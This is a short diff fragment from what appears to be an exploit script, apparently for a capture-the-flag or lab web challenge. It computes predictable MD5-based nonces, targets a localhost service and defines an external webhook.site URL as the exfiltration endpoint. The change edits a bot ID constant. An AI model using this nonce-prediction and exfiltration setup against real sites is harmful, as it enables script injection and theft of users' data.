@@ -939,7 +939,7 @@ def nonce(n):
     return base64.b64encode(hashlib.md5(str(n).encode()).digest()).decode()
 
 TARGET = "http://localhost:3000"
-BOT_NID = 5000
+BOT_NID = 1337
 EXFIL = "https://webhook.site/32e1d23b-7404-41d7-b145-fabd5e4ac470"
 
 scripts = "".join(
